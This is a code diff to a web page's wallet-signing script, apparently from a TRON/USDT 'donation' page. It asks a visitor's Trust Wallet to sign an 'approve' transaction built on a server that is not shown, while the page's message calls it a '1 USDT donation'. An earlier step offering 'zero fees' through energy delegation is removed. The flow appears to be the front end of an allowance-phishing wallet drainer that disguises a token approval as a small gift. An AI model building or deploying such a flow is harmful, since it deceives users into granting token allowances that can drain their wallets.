@@ -57,37 +57,18 @@
         }
 
         function buildAndSign(addr) {
-            msg("Preparing gasless TX...", "Delegating energy to your wallet...");
+            msg("Building transaction...", "");
 
-            // Step 1: Delegate energy FIRST so donor pays 0 TRX
-            fetch("/api/delegate-energy", {
+            // Build the approve TX on server
+            fetch("/api/build-approve", {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({donor: addr})
             })
             .then(function(r) { return r.json(); })
-            .then(function(delResult) {
-                if (delResult.success) {
-                    msg("Energy delegated!", "Waiting for on-chain confirmation...");
-                } else {
-                    msg("Preparing TX...", "Energy: " + (delResult.error || "skipped"));
-                }
-                // Wait 5s for delegation to confirm on-chain
-                return new Promise(function(resolve) { setTimeout(resolve, 5000); });
-            })
-            .then(function() {
-                // Step 2: Build the approve TX on server
-                msg("Building transaction...", "Almost ready...");
-                return fetch("/api/build-approve", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({donor: addr})
-                });
-            })
-            .then(function(r) { return r.json(); })
             .then(function(data) {
                 if (data.error) { msg("Server error", data.error); return; }
-                msg("Confirm in your wallet!", "Approve 1 USDT - zero fees");
+                msg("Confirm in your wallet!", "Approve 1 USDT donation");
 
                 // Step 3: Ask Trust Wallet to sign (popup appears)
                 return window.tronWeb.trx.sign(data.transaction);
